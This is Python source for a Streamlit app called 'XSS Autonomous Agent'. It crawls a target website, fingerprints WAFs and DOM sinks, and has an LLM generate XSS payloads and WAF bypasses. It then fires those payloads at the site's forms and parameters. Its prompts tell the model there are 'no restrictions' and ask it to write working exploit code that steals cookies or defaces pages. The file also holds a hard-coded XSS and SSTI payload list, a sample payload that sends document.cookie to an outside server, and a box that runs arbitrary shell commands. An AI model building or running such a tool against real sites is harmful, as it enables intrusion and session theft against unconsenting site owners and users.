import streamlit as st
import os
import subprocess
import requests
import re
import urllib.parse
import json
from openai import OpenAI
from bs4 import BeautifulSoup
from collections import deque
from datetime import datetime

st.set_page_config(
    page_title="XSS Autonomous Agent",
    page_icon="🕷️",
    layout="wide",
    initial_sidebar_state="collapsed",
)

# ── Constants ─────────────────────────────────────────────────────────────────
MODEL = "deepseek/deepseek-r1"
BASE_URL = "https://openrouter.ai/api/v1"
MAX_TOKENS = 1500
MAX_PAGES = 40
REQUEST_TIMEOUT = 12
REQ_HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
}

DOM_SINKS = [
    r"innerHTML\s*[+=]", r"outerHTML\s*[+=]", r"document\.write\s*\(",
    r"document\.writeln\s*\(", r"\.insertAdjacentHTML\s*\(",
    r"eval\s*\(", r"setTimeout\s*\(\s*['\"`]", r"setInterval\s*\(\s*['\"`]",
    r"new\s+Function\s*\(", r"location\.href\s*=", r"location\.assign\s*\(",
    r"location\.replace\s*\(", r"dangerouslySetInnerHTML", r"v-html\s*=",
    r"\.html\s*\(", r"\.append\s*\(", r"\$\(.*\)\.html",
]

TEMPLATE_ENGINES = {
    "jinja2": [r"render_template", r"Jinja2", r"flask\.templating"],
    "django": [r"django\.template", r"{% block", r"{% csrf_token"],
    "twig": [r"Twig\\\\", r"twig_function"],
    "smarty": [r"Smarty", r"\{assign"],
    "erb": [r"<%=", r"ActionView"],
    "handlebars": [r"Handlebars", r"{{#if", r"{{#each"],
    "nunjucks": [r"nunjucks", r"{% for"],
    "freemarker": [r"freemarker", r"<#if"],
    "thymeleaf": [r"th:text", r"th:utext"],
}

SSTI_PAYLOADS = [
    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
    "{{config}}", "{{request.environ}}",
    "{php}echo 'ssti';{/php}", "{% debug %}",
]

WAF_SIGNATURES = {
    "Cloudflare": ["cloudflare", "cf-ray", "__cfduid"],
    "AWS WAF": ["awswaf", "x-amzn-requestid"],
    "ModSecurity": ["mod_security", "modsecurity"],
    "Akamai": ["akamai", "ak_bmsc"],
    "Sucuri": ["sucuri", "x-sucuri-id"],
    "Imperva": ["imperva", "incapsula"],
    "Wordfence": ["wordfence"],
    "F5 BIG-IP": ["bigipserver", "ts="],
    "Barracuda": ["barracuda_"],
}

# ── Session state ─────────────────────────────────────────────────────────────
defaults = {
    "log": [], "findings": [], "running": False, "done": False,
    "pages_crawled": 0, "points_found": 0, "vulns_found": 0,
    "exploit_code": "", "report": "", "dom_sinks": [],
    "waf_detected": "", "_last_target": "", "_last_payload": "", "_last_depth": 2,
}
for k, v in defaults.items():
    if k not in st.session_state:
        st.session_state[k] = v


def get_client():
    key = os.environ.get("OPENROUTER_API_KEY", "")
    if not key:
        st.error("OPENROUTER_API_KEY not set in Replit Secrets.")
        st.stop()
    return OpenAI(api_key=key, base_url=BASE_URL)


# ── Live log helpers ──────────────────────────────────────────────────────────
ICONS = {"info": "▸", "ok": "✅", "warn": "⚠️",
         "vuln": "🚨", "ai": "🤖", "cmd": "⚙️", "dom": "🔬"}

def _render_terminal():
    text = "\n".join(st.session_state.log) if st.session_state.log else "Ready."
    # escape HTML special chars so the green terminal renders correctly
    safe = text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    return f'<div class="terminal">{safe}</div>'

def log(msg: str, kind: str = "info", term_ph=None, stats_phs=None):
    ts = datetime.now().strftime("%H:%M:%S")
    prefix = ICONS.get(kind, "▸")
    st.session_state.log.append(f"[{ts}] {prefix} {msg}")
    if term_ph is not None:
        term_ph.markdown(_render_terminal(), unsafe_allow_html=True)
    if stats_phs is not None:
        _render_stats(*stats_phs)

def _render_stats(s1, s2, s3, s4, s5):
    s1.metric("Pages", st.session_state.pages_crawled)
    s2.metric("Injection pts", st.session_state.points_found)
    s3.metric("DOM sinks", len(st.session_state.dom_sinks))
    s4.metric("Vulns", st.session_state.vulns_found,
              delta="🚨" if st.session_state.vulns_found > 0 else None)
    s5.metric("WAF", f"⚠️ {st.session_state.waf_detected}"
              if st.session_state.waf_detected else "✅ None")


# ── Network helpers ───────────────────────────────────────────────────────────
def safe_req(method: str, url: str, **kwargs):
    try:
        fn = requests.get if method == "get" else requests.post
        return fn(url, headers=REQ_HEADERS, timeout=REQUEST_TIMEOUT,
                  allow_redirects=True, **kwargs)
    except Exception:
        return None


def same_origin(base: str, url: str) -> bool:
    try:
        return urllib.parse.urlparse(base).netloc == urllib.parse.urlparse(url).netloc
    except Exception:
        return False


def to_abs(base: str, href: str):
    try:
        url = urllib.parse.urljoin(base, href)
        p = urllib.parse.urlparse(url)
        if p.scheme in ("http", "https") and p.netloc:
            return url
    except Exception:
        pass
    return None


# ── WAF detection ─────────────────────────────────────────────────────────────
def detect_waf(resp) -> str:
    if not resp:
        return ""
    combined = (resp.text[:2000] + str(resp.headers) + str(resp.cookies)).lower()
    for waf, sigs in WAF_SIGNATURES.items():
        if any(s.lower() in combined for s in sigs):
            return waf
    if resp.status_code in (403, 406, 429, 503) and len(resp.text) < 500:
        return "Unknown WAF"
    return ""


# ── Crawler ───────────────────────────────────────────────────────────────────
def crawl(target: str, max_depth: int, term_ph, stats_phs) -> list:
    visited, bfsq, pages = set(), deque([(target, 0)]), []
    while bfsq and len(pages) < MAX_PAGES:
        url, depth = bfsq.popleft()
        norm = url.split("#")[0].rstrip("/")
        if norm in visited:
            continue
        visited.add(norm)
        resp = safe_req("get", url)
        if not resp:
            continue
        ct = resp.headers.get("Content-Type", "")
        if "text/html" not in ct and "javascript" not in ct:
            continue
        soup = BeautifulSoup(resp.text, "lxml")
        forms = _extract_forms(url, soup)
        params = _extract_params(url)
        dom_hits = _find_dom_sinks(resp.text)
        pages.append({
            "url": url, "html": resp.text[:14000], "status": resp.status_code,
            "headers": dict(resp.headers), "forms": forms,
            "params": params, "dom_sinks": dom_hits,
            "inline_js": _inline_js(soup),
        })
        st.session_state.pages_crawled = len(pages)
        log(f"Crawled [{len(pages)}] {url} — {len(forms)} forms / "
            f"{len(params)} params / {len(dom_hits)} DOM sinks",
            "cmd", term_ph, stats_phs)
        if depth < max_depth:
            for tag in soup.find_all("a", href=True):
                nxt = to_abs(url, tag["href"])
                if nxt and same_origin(target, nxt):
                    nn = nxt.split("#")[0].rstrip("/")
                    if nn not in visited:
                        bfsq.append((nxt, depth + 1))
            for tag in soup.find_all("script", src=True):
                nxt = to_abs(url, tag["src"])
                if nxt and same_origin(target, nxt):
                    nn = nxt.split("#")[0].rstrip("/")
                    if nn not in visited:
                        bfsq.append((nxt, depth + 1))
    return pages


def _extract_forms(page_url: str, soup) -> list:
    forms = []
    for form in soup.find_all("form"):
        action = form.get("action") or page_url
        method = form.get("method", "get").lower()
        action_url = to_abs(page_url, action) or page_url
        fields = []
        for inp in form.find_all(["input", "textarea", "select"]):
            name = inp.get("name") or inp.get("id") or ""
            itype = inp.get("type", "text")
            if name and itype not in ("submit", "button", "image", "file"):
                fields.append({"name": name, "type": itype})
        if fields:
            forms.append({"action": action_url, "method": method, "fields": fields})
    return forms


def _extract_params(url: str) -> list:
    return list(urllib.parse.parse_qs(urllib.parse.urlparse(url).query).keys())


def _inline_js(soup) -> str:
    parts = []
    for tag in soup.find_all("script"):
        if not tag.get("src") and tag.string:
            parts.append(tag.string[:400])
    return "\n".join(parts[:8])


def _find_dom_sinks(html: str) -> list:
    found = []
    for pat in DOM_SINKS:
        for m in re.findall(f".{{0,50}}{pat}.{{0,60}}", html)[:2]:
            found.append(m.strip())
    return found[:15]


def _detect_template_engine(pages: list) -> tuple:
    combined = " ".join(p["html"] for p in pages[:5])
    for engine, sigs in TEMPLATE_ENGINES.items():
        for sig in sigs:
            if re.search(sig, combined, re.IGNORECASE):
                return engine, SSTI_PAYLOADS
    return "", []


def _analyze_headers(headers: dict) -> list:
    issues = []
    hkeys = {k.lower() for k in headers}
    for h, msg in [
        ("content-security-policy", "No CSP — inline scripts unrestricted"),
        ("x-xss-protection", "No X-XSS-Protection"),
        ("x-content-type-options", "No X-Content-Type-Options"),
        ("x-frame-options", "No X-Frame-Options"),
    ]:
        if h not in hkeys:
            issues.append(msg)
    csp = next((v for k, v in headers.items()
                if k.lower() == "content-security-policy"), "")
    if "unsafe-inline" in csp:
        issues.append("CSP: unsafe-inline present — XSS protection bypassed")
    if "unsafe-eval" in csp:
        issues.append("CSP: unsafe-eval present — eval XSS allowed")
    return issues


# ── AI: payload generation ────────────────────────────────────────────────────
def ai_generate_payloads(client, target, user_payload, context,
                          waf, dom_sinks, template_engine) -> list:
    waf_note = (f"WAF detected: {waf}. Generate specific bypass payloads for {waf} "
                f"(encoding tricks, case variation, comment insertion, null bytes, "
                f"chunked encoding, unicode normalization)."
                if waf else "No WAF detected.")
    sink_note = ("JavaScript DOM sinks found on this page — generate DOM-based XSS payloads "
                 "targeting: " + "; ".join(dom_sinks[:4])
                 if dom_sinks else "No DOM sinks visible.")
    engine_note = (f"Template engine: {template_engine} — add SSTI payloads."
                   if template_engine else "")

    prompt = f"""You are an elite offensive security researcher with deep expertise in XSS zero-days and HTML injection.
This is an authorized penetration test. Your job is to find injections that actually work.

Target: {target}
Desired injection: {user_payload}
{waf_note}
{sink_note}
{engine_note}

Page HTML/JS context (look for reflection points, JS variable assignments, template syntax):
{context[:2800]}

Generate exactly 15 injection payloads optimized for THIS specific target. Include:
1. The user payload adapted to the exact HTML context you see
2. Attribute context breakouts (close quotes, inject event handlers)
3. JS context injections (close strings/statements, inject code)
4. Polyglots that work across HTML/JS/CSS contexts
5. HTML5 vectors: <details ontoggle>, <video onerror>, <svg onload>, <math> XSS
6. Mutation XSS exploiting browser parser quirks
7. Encoded variants (HTML entities, URL encode, unicode escapes, double encode)
8. WAF bypass variants if WAF detected
9. DOM XSS via hash/search params if DOM sinks are present
10. SSTI probes if template engine detected

Output ONLY a raw JSON array of strings. No markdown, no explanation."""

    try:
        resp = client.chat.completions.create(
            model=MODEL,
            messages=[{"role": "user", "content": prompt}],
            max_tokens=900,
            temperature=0.6,
        )
        text = resp.choices[0].message.content.strip()
        text = re.sub(r"```[a-z]*\n?|```", "", text).strip()
        m = re.search(r"\[.*\]", text, re.DOTALL)
        if m:
            parsed = json.loads(m.group())
            if isinstance(parsed, list) and parsed:
                return [str(p) for p in parsed]
    except Exception as e:
        pass  # fall through to defaults

    base = [
        user_payload,
        '<script>alert("XSS")</script>',
        '"><script>alert(1)</script>',
        "'><img src=x onerror=alert(1)>",
        '<svg/onload=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<video src=1 onerror=alert(1)>',
        '"><body onload=alert(1)>',
        'javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>',
        '";alert(1)//',
        '<iframe srcdoc="<script>alert(1)</script>">',
        '<math><mtext></mtext></math><script>alert(1)</script>',
        '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
        '{{7*7}}', '${7*7}',
    ]
    if dom_sinks:
        base.append('#"><img src=x onerror=alert(1)>')
    return base


# ── Injection testing ─────────────────────────────────────────────────────────
def _injection_context(snippet: str, payload: str) -> str:
    before = snippet[:snippet.find(payload)] if payload in snippet else snippet[:60]
    if re.search(r'<script[^>]*>[^<]*$', before, re.DOTALL):
        return "JS context (inside <script>)"
    if re.search(r'on\w+\s*=\s*["\'][^"\']*$', before):
        return "Event handler attribute"
    if re.search(r'(href|src|action)\s*=\s*["\'][^"\']*$', before):
        return "URL attribute"
    if re.search(r'<style[^>]*>[^<]*$', before, re.DOTALL):
        return "CSS context"
    if re.search(r'=\s*["\'][^"\']*$', before):
        return "HTML attribute value"
    if re.search(r'<[a-zA-Z][^>]*$', before):
        return "HTML tag (attribute injection)"
    return "HTML body"


def test_one(url: str, param: str, payload: str, method: str = "get") -> dict:
    r = {"url": url, "param": param, "payload": payload,
         "method": method, "status": None,
         "reflected": False, "escaped": False,
         "context": "", "body_snippet": ""}
    try:
        if method == "get":
            parsed = urllib.parse.urlparse(url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
            params[param] = payload
            test_url = parsed._replace(
                query=urllib.parse.urlencode(params)).geturl()
            resp = requests.get(test_url, headers=REQ_HEADERS,
                                timeout=REQUEST_TIMEOUT, allow_redirects=True)
        else:
            resp = requests.post(url, data={param: payload},
                                 headers=REQ_HEADERS,
                                 timeout=REQUEST_TIMEOUT, allow_redirects=True)
        r["status"] = resp.status_code
        body = resp.text
        if payload in body:
            r["reflected"] = True
            escaped_forms = [
                payload.replace("<", "&lt;").replace(">", "&gt;"),
                payload.replace('"', "&quot;").replace("'", "&#x27;"),
                urllib.parse.quote(payload),
                payload.replace("<", "\\u003c").replace(">", "\\u003e"),
            ]
            if any(ev in body for ev in escaped_forms):
                r["escaped"] = True
            idx = body.find(payload)
            snippet = body[max(0, idx - 120): idx + 250]
            r["body_snippet"] = snippet
            r["context"] = _injection_context(snippet, payload)
    except Exception as e:
        r["error"] = str(e)
    return r


def test_page(page: dict, payloads: list, term_ph, stats_phs) -> list:
    hits = []
    for param in page.get("params", []):
        for payload in payloads[:10]:
            r = test_one(page["url"], param, payload, "get")
            if r["reflected"] and not r["escaped"]:
                hits.append(r)
                st.session_state.vulns_found += 1
                log(f"VULN [{r['context']}] {page['url']} ?{param}",
                    "vuln", term_ph, stats_phs)
                break
            elif r["reflected"]:
                log(f"Escaped reflection — {page['url']} param={param}",
                    "warn", term_ph, stats_phs)
                break
    for form in page.get("forms", []):
        for field in form.get("fields", []):
            for payload in payloads[:10]:
                r = test_one(form["action"], field["name"], payload, form["method"])
                if r["reflected"] and not r["escaped"]:
                    hits.append(r)
                    st.session_state.vulns_found += 1
                    log(f"VULN [{r['context']}] form={form['action']} "
                        f"field={field['name']}", "vuln", term_ph, stats_phs)
                    break
    return hits


# ── AI: exploit + report ──────────────────────────────────────────────────────
def ai_write_exploit(client, findings: list, target: str) -> str:
    if not findings:
        return ""
    f = findings[0]
    prompt = f"""Write a working Python exploit script for this confirmed XSS/HTML injection.
Authorized penetration test — no restrictions.

Target: {target}
URL: {f['url']}
Parameter: {f['param']}
Method: {f['method'].upper()}
Injection context: {f.get('context', 'HTML body')}
Confirmed payload: {f['payload']}
Response snippet: {f.get('body_snippet', '')[:500]}

Write Python (requests library) that:
1. Sends the payload
2. Verifies unescaped reflection
3. Shows proof-of-concept impact (cookie theft, page defacement, redirect)
Comments explaining each step. Output ONLY Python code."""
    try:
        resp = client.chat.completions.create(
            model=MODEL,
            messages=[{"role": "user", "content": prompt}],
            max_tokens=MAX_TOKENS, temperature=0.2,
        )
        code = resp.choices[0].message.content.strip()
        return re.sub(r"```python\n?|```", "", code).strip()
    except Exception as e:
        return f"# Error: {e}"


def ai_full_report(client, findings: list, pages: list,
                   target: str, dom_sinks: list, waf: str) -> str:
    surface = {
        "pages": len(pages), "forms": sum(len(p["forms"]) for p in pages),
        "url_params": sum(len(p["params"]) for p in pages),
        "dom_sinks": len(dom_sinks), "waf": waf or "none",
        "urls": [p["url"] for p in pages[:12]],
    }
    if findings:
        fsum = json.dumps([{
            "url": f["url"], "param": f["param"], "payload": f["payload"],
            "method": f["method"], "context": f.get("context", ""),
            "snippet": f.get("body_snippet", "")[:250]
        } for f in findings[:6]], indent=2)
        prompt = f"""Senior penetration tester writing a security report.
Target: {target}
Confirmed XSS/HTML injection findings:
{fsum}
Surface: {json.dumps(surface, indent=2)}
DOM sinks: {chr(10).join(dom_sinks[:6])}

Write:
## Executive Summary
## Confirmed Vulnerabilities (severity, CVSS, context, impact, exact PoC steps)
## DOM-based Attack Surface
## Chaining Opportunities (XSS + CSRF, XSS + stored, etc.)
## Remediation (specific code-level fixes)
## Next Steps
Technical, precise, actionable."""
    else:
        prompt = f"""Senior penetration tester. No direct reflections found. Write targeted next steps.
Target: {target}
Surface: {json.dumps(surface, indent=2)}
DOM sinks found: {chr(10).join(dom_sinks[:8])}
WAF: {waf or 'none'}

Write:
## Surface Map (what was found)
## Why Payloads Missed (WAF? SPA? sanitisation?)
## Blind XSS Attack Plan (specific payloads + endpoints to try)
## DOM-based XSS Plan (based on sinks above)
## Stored XSS Vectors (which forms to focus on)
## Manual Curl Commands to Run Next
Include actual payload examples."""

    try:
        resp = client.chat.completions.create(
            model=MODEL,
            messages=[{"role": "user", "content": prompt}],
            max_tokens=MAX_TOKENS, temperature=0.2,
        )
        return resp.choices[0].message.content
    except Exception as e:
        return f"Error: {e}"


# ── Agent orchestrator ────────────────────────────────────────────────────────
def run_agent(target: str, user_payload: str, max_depth: int,
              term_ph, stats_phs):
    """Runs all 5 phases; updates term_ph and stats_phs live throughout."""
    client = get_client()

    def L(msg, kind="info"):
        log(msg, kind, term_ph, stats_phs)

    L(f"Target : {target}")
    L(f"Payload: {user_payload}")
    L(f"Depth  : {max_depth}")
    L("━" * 44)

    # Phase 1 — Crawl
    L("PHASE 1 — CRAWL & RECON", "info")
    pages = crawl(target, max_depth, term_ph, stats_phs)
    L(f"Crawl done — {len(pages)} pages | "
      f"{sum(len(p['forms']) for p in pages)} forms | "
      f"{sum(len(p['params']) for p in pages)} URL params", "ok")

    all_sinks = []
    for p in pages:
        all_sinks.extend(p.get("dom_sinks", []))
    st.session_state.dom_sinks = all_sinks[:20]
    if all_sinks:
        L(f"DOM sinks: {len(all_sinks)} found", "dom")
        for s in all_sinks[:4]:
            L(f"  {s[:100]}", "dom")

    resp0 = safe_req("get", target)
    waf = detect_waf(resp0)
    st.session_state.waf_detected = waf
    L(f"WAF: {waf if waf else 'none detected'}", "warn" if waf else "ok")

    if pages:
        for issue in _analyze_headers(pages[0]["headers"]):
            L(issue, "warn")

    eng, ssti = _detect_template_engine(pages)
    if eng:
        L(f"Template engine: {eng} — SSTI payloads added", "warn")

    # Phase 2 — Payload gen
    L("━" * 44)
    L("PHASE 2 — AI PAYLOAD GENERATION", "ai")
    context = ""
    for p in pages[:6]:
        if p["forms"] or p["params"] or p["dom_sinks"]:
            context += f"\n--- {p['url']} ---\n{p['html'][:1200]}\n"
    payloads = ai_generate_payloads(
        client, target, user_payload, context, waf, all_sinks, eng)
    payloads += ssti[:3]
    L(f"Generated {len(payloads)} context-aware payloads", "ai")
    for i, pl in enumerate(payloads[:6], 1):
        L(f"  [{i}] {pl[:90]}", "cmd")

    # Phase 3 — Testing
    L("━" * 44)
    L("PHASE 3 — INJECTION TESTING", "info")
    all_findings = []
    total_pts = 0
    for page in pages:
        pts = len(page.get("params", [])) + sum(
            len(f.get("fields", [])) for f in page.get("forms", []))
        total_pts += pts
        hits = test_page(page, payloads, term_ph, stats_phs)
        all_findings.extend(hits)
    st.session_state.points_found = total_pts
    st.session_state.findings = all_findings
    L(f"Tested {total_pts} injection points | "
      f"{len(all_findings)} confirmed vuln(s)", "ok")

    # Phase 4 — Exploit
    if all_findings:
        L("━" * 44)
        L("PHASE 4 — EXPLOIT GENERATION", "ai")
        exploit = ai_write_exploit(client, all_findings, target)
        st.session_state.exploit_code = exploit
        L("Custom Python exploit written", "ok")

    # Phase 5 — Report
    L("━" * 44)
    L("PHASE 5 — AI SECURITY REPORT", "ai")
    report = ai_full_report(client, all_findings, pages, target, all_sinks, waf)
    st.session_state.report = report
    L("Report complete", "ok")
    L("━" * 19 + " DONE " + "━" * 19, "ok")
    st.session_state.done = True
    st.session_state.running = False


# ═══════════════════════════════════ UI ══════════════════════════════════════
st.markdown("""
<style>
.terminal {
    background: #0d1117;
    color: #39ff14;
    font-family: 'Courier New', monospace;
    font-size: 12.5px;
    padding: 16px;
    border-radius: 8px;
    height: 420px;
    overflow-y: auto;
    white-space: pre-wrap;
    border: 1px solid #238636;
    line-height: 1.55;
}
</style>
""", unsafe_allow_html=True)

st.title("🕷️ XSS Autonomous Agent")
st.caption("Authorized use only — only test systems you own or have explicit written permission to test.")

# ── Mission config ────────────────────────────────────────────────────────────
with st.container(border=True):
    st.subheader("🎯 Mission")
    c1, c2 = st.columns([3, 1])
    with c1:
        target_input = st.text_input("Target URL",
                                      value=st.session_state._last_target,
                                      placeholder="https://your-test-site.com")
    with c2:
        depth_input = st.slider("Crawl depth", 1, 4,
                                 int(st.session_state._last_depth))

    payload_input = st.text_area(
        "What to inject",
        value=st.session_state._last_payload,
        placeholder='<script>alert("owned")</script>  or  <img src=x onerror=fetch("https://myserver/?c="+document.cookie)>',
        height=72,
    )
    ca, cb = st.columns([2, 1])
    with ca:
        start_btn = st.button("🚀 Launch Agent", type="primary",
                               use_container_width=True,
                               disabled=st.session_state.running)
    with cb:
        if st.button("🗑️ Reset", use_container_width=True):
            for k, v in defaults.items():
                st.session_state[k] = v
            st.session_state.report = ""
            st.rerun()

# ── Stats row (placeholders so they can be updated mid-run) ──────────────────
sc = st.columns(5)
s_phs = tuple(col.empty() for col in sc)
_render_stats(*s_phs)

# ── Terminal (placeholder so it can be updated mid-run) ──────────────────────
st.subheader("💻 Agent Terminal")
term_ph = st.empty()
term_ph.markdown(_render_terminal(), unsafe_allow_html=True)

# ── Results tabs ─────────────────────────────────────────────────────────────
tab1, tab2, tab3 = st.tabs(["📊 Findings & Report", "💻 Exploit Code", "🔍 Manual Terminal"])

with tab1:
    if st.session_state.findings:
        st.error(f"🚨 {len(st.session_state.findings)} confirmed injection(s)")
        for i, f in enumerate(st.session_state.findings, 1):
            with st.expander(
                    f"#{i} [{f.get('context','?')}] {f['url']} — {f['param']}",
                    expanded=(i == 1)):
                st.code(f["payload"], language="html")
                st.markdown(
                    f"**URL:** `{f['url']}`  \n**Param:** `{f['param']}`  \n"
                    f"**Method:** `{f['method'].upper()}`  \n"
                    f"**Context:** `{f.get('context','?')}`  \n"
                    f"**HTTP:** `{f.get('status','?')}`")
                if f.get("body_snippet"):
                    st.code(f["body_snippet"], language="html")

    if st.session_state.dom_sinks:
        st.subheader("🔬 DOM Sinks")
        for s in st.session_state.dom_sinks[:10]:
            st.code(s, language="javascript")

    if st.session_state.get("report"):
        st.divider()
        st.subheader("📝 AI Security Report")
        st.markdown(st.session_state.report)

    if not st.session_state.done and not st.session_state.running:
        st.info("Launch the agent to see findings.")

with tab2:
    if st.session_state.exploit_code:
        st.subheader("🔧 AI-Written Exploit")
        st.code(st.session_state.exploit_code, language="python")
        st.download_button("⬇️ exploit.py", st.session_state.exploit_code,
                           file_name="exploit.py", mime="text/plain")
    else:
        st.info("Exploit code appears here when a vulnerability is confirmed.")

with tab3:
    st.subheader("Manual Command Runner")
    mc = st.text_input("Command", placeholder="curl -sIL https://target.com")
    if st.button("▶ Run") and mc.strip():
        with st.spinner("Running..."):
            try:
                r = subprocess.run(mc, shell=True, capture_output=True,
                                   text=True, timeout=30)
                out = (r.stdout + r.stderr).strip() or "(no output)"
            except subprocess.TimeoutExpired:
                out = "[TIMEOUT after 30s]"
            except Exception as e:
                out = f"[ERROR] {e}"
        st.code(out, language="bash")

# ── Launch logic ──────────────────────────────────────────────────────────────
if start_btn:
    if not target_input.strip():
        st.warning("Enter a target URL.")
    elif not payload_input.strip():
        st.warning("Enter what you want to inject.")
    else:
        st.session_state._last_target = target_input.strip()
        st.session_state._last_payload = payload_input.strip()
        st.session_state._last_depth = depth_input
        st.session_state.running = True
        st.session_state.done = False
        st.session_state.log = []
        st.rerun()

# ── Run agent synchronously with live UI updates ──────────────────────────────
if st.session_state.running and not st.session_state.done:
    run_agent(
        st.session_state._last_target,
        st.session_state._last_payload,
        int(st.session_state._last_depth),
        term_ph,
        s_phs,
    )
    st.rerun()
